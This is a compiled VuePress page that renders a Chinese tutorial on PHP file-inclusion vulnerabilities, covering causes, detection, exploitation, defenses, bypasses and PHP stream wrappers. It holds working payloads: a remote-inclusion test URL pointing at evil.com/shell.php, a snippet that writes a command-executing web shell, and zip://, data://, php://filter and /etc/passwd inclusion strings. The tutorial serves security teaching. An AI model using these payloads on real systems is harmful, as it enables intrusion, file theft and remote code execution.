import{_ as n,W as a,X as r,Y as e,Z as t,a0 as i,a1 as d,C as s}from"./framework-b6a07282.js";const h="/assets/4-ffecb2de.jpg",p="/assets/5-c69983ee.jpg",o="/assets/6-5c4d14a4.jpg",c="/assets/7-f921fdf2.jpg",u="/assets/3-abac446d.jpg",_="/assets/4-ed7a5637.png",b={},v=d('<h2 id="文件包含漏洞" tabindex="-1"><a class="header-anchor" href="#文件包含漏洞" aria-hidden="true">#</a> 文件包含漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li><p>文件包含漏洞是一种代码注入的漏洞，它利用了开发人员为了代码的灵活性和复用性，将被包含的文件设置为变量，用来进行动态调用。</p></li><li><p>如果文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，那么就可能包含其他恶意文件，导致执行了非预期的代码。</p></li><li><p>文件包含漏洞分为本地文件包含（LFI）和远程文件包含（RFI），本地文件包含（LFI）是指包含服务器上已存在的文件，远程文件包含（RFI）是指通过URL或者其他方式从外部获取并包含一个文件。</p></li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li><p>开发人员没有对文件包含函数(include、require、include_once、require_once)的参数进行严格的过滤或者限制，导致用户可以控制包含的文件，从而执行恶意代码。</p><h4 id="php文件包含函数" tabindex="-1"><a class="header-anchor" href="#php文件包含函数" aria-hidden="true">#</a> PHP文件包含函数</h4><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>include()</td><td>include 语句包含并运行指定文件</td></tr><tr><td>include_once()</td><td>只包含一次，不重复包含</td></tr><tr><td>require()</td><td>和include一样，不过出错时会停止</td></tr><tr><td>require_once()</td><td>和include_once一样</td></tr><tr><td>fopen()</td><td>打开文件或者 URL</td></tr></tbody></table><h4 id="phpini中的参数" tabindex="-1"><a class="header-anchor" href="#phpini中的参数" aria-hidden="true">#</a> phpini中的参数</h4><p>allow_url_fopen和allow_url_include是两个重要的参数，它们的意思是：</p><ul><li>allow_url_fopen：是否允许将URL（HTTP，HTTPS等）作为文件打开处理。如果设置为On，那么可以使用fopen(), file_get_contents()等函数打开远程URL，可能导致远程文件包含漏洞。</li><li>allow_url_include：是否允许将URL（HTTP，HTTPS等）作为代码执行处理。如果设置为On，那么可以使用include(), require()等函数执行远程URL中的代码，可能导致远程代码执行漏洞。</li></ul></li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><p>检测文件包含漏洞的方法有以下几种：</p><ul><li>观察URL链接是否包含类似page、include、path、file、link、url等关键字，如果有，尝试修改参数值为一个已知的文件，如/etc/passwd或index.php，看是否能够显示文件内容。 例如：?file=content、?page=xy.asp、?home=xy.html</li><li>观察URL，出现的赋值参数等号后跟的信息，是否为一个文件，如果是，则可能存在文件包含漏洞；</li></ul>',8),m={href:"http://evil.com/shell.php%EF%BC%9B",target:"_blank",rel:"noopener noreferrer"},f=e("ul",null,[e("li",null,"使用一些常见的扫描工具或者脚本，如AWVS、Nmap、Burp Suite等，对目标网站进行扫描和测试。")],-1),g=e("h3",{id:"_4-该漏洞会造成什么危害",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#_4-该漏洞会造成什么危害","aria-hidden":"true"},"#"),t(" 4.该漏洞会造成什么危害？")],-1),x=e("ol",null,[e("li",null,"web服务器的文件被外界浏览，导致信息泄露，如web配置文件、数据库密码等"),e("li",null,"脚本被任意执行，导致网站被篡改，如插入恶意代码、上传木马、删除数据等")],-1),w=e("h3",{id:"_5-如何利用这个漏洞",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#_5-如何利用这个漏洞","aria-hidden":"true"},"#"),t(" 5.如何利用这个漏洞？")],-1),S=e("thead",null,[e("tr",null,[e("th",null,"描述"),e("th",null,"效果")])],-1),T=e("tr",null,[e("td",null,"1.如果目标服务器开启了allow_url_include选项，可以通过包含远程服务器的恶意文件来执行代码。"),e("td",null,[e("img",{src:h})])],-1),P=e("tr",null,[e("td",null,"2.如果目标服务器开启了allow_url_include选项，但自己没有远程服务器，可以使用伪协议php://input来注入代码。第二张图为在当前目录生成一句话木马。"),e("td",null,[e("img",{src:p})])],-1),I=e("td",null,[t("代码："),e("code",null,`<?php fputs(fopen('my_shell.php','w'),'<?php system($_GET["cmd"]);?>');?>`)],-1),U=e("img",{src:o},null,-1),y=e("br",null,null,-1),O={href:"http://localhost:8085/vulnerabilities/fi/my_shell.php?cmd=whoami",target:"_blank",rel:"noopener noreferrer"},F=e("tr",null,[e("td",null,"3.如果目标服务器有phpinfo页面，可以通过上传临时文件并包含它来执行代码。"),e("td")],-1),z=e("tr",null,[e("td",null,"4.如果目标服务器是windows系统，可以尝试利用windows默认开启的共享文件夹来包含文件。"),e("td")],-1),L=e("tr",null,[e("td",null,"5.通过配合文件上传漏洞，在图片中植入php恶意代码，再进行文件包含。"),e("td")],-1),C=e("tr",null,[e("td",null,"6.通过将恶意代码写入日志文件，再进行文件包含。"),e("td")],-1),D=e("tr",null,[e("td",null,[t("7.使用包装器如zip://，来包含压缩文件shell.zip中的shell.php文件。"),e("br"),t("?page=zip://shell.zip%23shell.php&tf=whoami")]),e("td",null,[e("img",{src:c})])],-1),E=e("h3",{id:"_6-如何修复-防御这个漏洞",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#_6-如何修复-防御这个漏洞","aria-hidden":"true"},"#"),t(" 6.如何修复/防御这个漏洞？")],-1),R=e("li",null,"对用户输入的变量进行过滤或者白名单验证，只允许包含指定的文件。",-1),B=e("li",null,"关闭PHP中的allow_url_include和allow_url_fopen选项，防止远程文件包含。",-1),J={href:"http://xn--dxz",target:"_blank",rel:"noopener noreferrer"},M=e("li",null,"使用绝对路径而不是相对路径来包含文件。",-1),A=e("li",null,"对用户输入进行编码或转义",-1),H=e("li",null,"对敏感信息和配置文件进行加密或者隐藏。",-1),N=e("h3",{id:"_7-在有防御措施的情况下-如何绕过防御",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#_7-在有防御措施的情况下-如何绕过防御","aria-hidden":"true"},"#"),t(" 7.在有防御措施的情况下，如何绕过防御？")],-1),k=e("li",null,"利用PHP伪协议，如php://filter, php://input等，绕过文件名的过滤或执行代码",-1),K=e("li",null,"利用PHP包装器，如zip://, phar://等，绕过目录限制或执行代码",-1),q=e("li",null,"利用编码：如Base64编码，url编码，绕过文件后缀的限制或执行代码",-1),j={href:"ftp://%E7%AD%89",target:"_blank",rel:"noopener noreferrer"},V=e("li",null,"%00截断，条件是 magic_quotes_gpc 关闭，而且php版本小于5.3.4。",-1),W=e("li",null,"双写，如：..././..././、hthttp://tp://",-1),G=d(`<h3 id="php伪协议" tabindex="-1"><a class="header-anchor" href="#php伪协议" aria-hidden="true">#</a> PHP伪协议</h3><ul><li><p>PHP伪协议是PHP支持的协议和封装协议，可以用来访问不同类型的资源，如文件、输入流、过滤器等。</p></li><li><p>file:// — 访问本地文件系统</p></li><li><p>http:// — 访问 HTTP(s) 网址</p></li><li><p>ftp:// — 访问 FTP(s) URLs</p></li><li><p>php:// — 访问各个输入/输出流（I/O streams）</p></li><li><p>zlib:// — 压缩流</p></li><li><p>data:// — 数据（RFC 2397）</p></li><li><p>glob:// — 查找匹配的文件路径模式</p></li><li><p>phar:// — PHP 归档</p></li><li><p>ssh2:// — 安全外壳协议 2</p></li><li><p>rar:// — RAR</p></li><li><p>ogg:// — 音频流</p></li><li><p>expect:// — 处理交互式的流</p></li><li><p>需要开启allow_url_fopen的：php://input、php://stdin、php://memory和php://temp</p></li><li><p>不需要开启allow_wrl_fopen的：php://filter</p></li></ul><h4 id="php-filter" tabindex="-1"><a class="header-anchor" href="#php-filter" aria-hidden="true">#</a> php://filter</h4><ul><li><strong>php://filter</strong>：用来对资源进行过滤或转换。如：编码、解码、压缩等。可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</li></ul><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（\`</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（\`</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h5 id="用法" tabindex="-1"><a class="header-anchor" href="#用法" aria-hidden="true">#</a> 用法：</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>php://filter/read=convert.base64-encode/resource=index.php #convert.base64-encode是一个过滤器
php://filter/resource=index.php #如果不编码则当作是php文件执行
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="过滤器" tabindex="-1"><a class="header-anchor" href="#过滤器" aria-hidden="true">#</a> 过滤器</h5><ul><li><strong>字符串过滤器</strong> 该类通常以string开头，对每个字符都进行同样方式的处理。</li></ul><table><thead><tr><th>过滤器</th><th>描述</th></tr></thead><tbody><tr><td>string.rot13</td><td>一种字符处理方式，字符右移十三位</td></tr><tr><td>string.toupper</td><td>将所有字符转换为大写</td></tr><tr><td>string.tolower</td><td>将所有字符转换为小写</td></tr><tr><td>string.strip_tags</td><td>这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处</td></tr></tbody></table><ul><li><strong>转换过滤器</strong> 对数据流进行编码，通常用来读取文件源码。</li></ul><table><thead><tr><th>过滤器</th><th>描述</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>base64加密解密</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</td></tr><tr><td>convert.iconv.a.b或convert.iconv.a/b</td><td>将指定的文件从a编码转换为b编码输出</td></tr></tbody></table><p>php支持的编码格式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-mac（别名：MacJapanese）
SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）
SJIS-Mobile#KDDI（别名：SJIS-KDDI）
SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）
UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）
UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）
ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>压缩过滤器</strong> 注意，这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</li></ul><table><thead><tr><th>过滤器</th><th>描述</th></tr></thead><tbody><tr><td>zlib.deflate</td><td>压缩</td></tr><tr><td>zlib.inflate</td><td>解压</td></tr><tr><td>bzip2.compress</td><td>压缩</td></tr><tr><td>bzip2.decompress</td><td>解压</td></tr></tbody></table><ul><li><p><strong>加密过滤器</strong></p><p>mcrypt和 mdecrypt使用 libmcrypt 提供了对称的加密和解密。</p></li></ul><table><thead><tr><th>过滤器</th><th>描述</th></tr></thead><tbody><tr><td>mcrypt</td><td>对称加密</td></tr><tr><td>mdecrypt</td><td>对称解密</td></tr></tbody></table>`,18),X={href:"https://www.leavesongs.com/PENETRATION/php-filter-magic.html",target:"_blank",rel:"noopener noreferrer"},Y=d(`<h4 id="data" tabindex="-1"><a class="header-anchor" href="#data" aria-hidden="true">#</a> data://</h4><ul><li>用于嵌入数据到代码中，如图片、文本等。当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</li></ul><h5 id="用法-1" tabindex="-1"><a class="header-anchor" href="#用法-1" aria-hidden="true">#</a> 用法</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1、data://text/plain,
http://127.0.0.1/include.php
?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
?file2=data://text/plain,hello ctf
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="file" tabindex="-1"><a class="header-anchor" href="#file" aria-hidden="true">#</a> file://</h4><ul><li>用于访问本地或远程文件系统。，并且不受allow_url_fopen，allow_url_include影响，file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)</li></ul><h5 id="用法-2" tabindex="-1"><a class="header-anchor" href="#用法-2" aria-hidden="true">#</a> 用法</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://www.xx.com?file=file:///etc/passsword
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="php-input" tabindex="-1"><a class="header-anchor" href="#php-input" aria-hidden="true">#</a> php://input</h4><ul><li><strong>php://input</strong>用来读取原始请求数据，比如POST或PUT请求的内容，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</li><li>需要开启</li></ul><p>注意： 当enctype=&quot;multipart/form-data&quot;的时候 php://input\` 是无效的</p><p>遇到file_get_contents()要想到用php://input绕过。</p><h5 id="用法-3" tabindex="-1"><a class="header-anchor" href="#用法-3" aria-hidden="true">#</a> 用法</h5><img src="`+u+`" style="zoom:80%;"><h4 id="zip" tabindex="-1"><a class="header-anchor" href="#zip" aria-hidden="true">#</a> zip://</h4><ul><li>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
?page=zip://shell.zip%23shell.php&amp;tf=whoami
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+_+'" style="zoom:80%;"><h3 id="测试地点" tabindex="-1"><a class="header-anchor" href="#测试地点" aria-hidden="true">#</a> 测试地点</h3><ul><li>包的cookie里，get、post请求中，数据包头，发散思维，都测测。</li></ul>',20);function Z($,Q){const l=s("ExternalLinkIcon");return a(),r("div",null,[v,e("p",null,[t("如果存在以上特征，可以尝试修改URL中的参数值，看是否能够包含其他本地或远程的文件，例如：?file=…/…/…/…/etc/passwd或?file="),e("a",m,[t("http://evil.com/shell.php；"),i(l)])]),f,g,x,w,e("table",null,[S,e("tbody",null,[T,P,e("tr",null,[I,e("td",null,[U,y,e("a",O,[t("http://localhost:8085/vulnerabilities/fi/my_shell.php?cmd=whoami"),i(l)])])]),F,z,L,C,D])]),E,e("ol",null,[R,B,e("li",null,[t("使用黑名单过滤掉危险的字符或字符串，如…/, "),e("a",J,[t("http://等"),i(l)])]),M,A,H]),N,e("ol",null,[k,K,q,e("li",null,[t("利用远程URL，如http://, "),e("a",j,[t("ftp://等"),i(l)]),t("，绕过本地文件的限制或执行代码（需要开启allow_url_fopen和allow_url_include）")]),V,W]),G,e("p",null,[t("更多妙用："),e("a",X,[t("https://www.leavesongs.com/PENETRATION/php-filter-magic.html"),i(l)])]),Y])}const te=n(b,[["render",Z],["__file","文件包含漏洞.html.vue"]]);export{te as default};
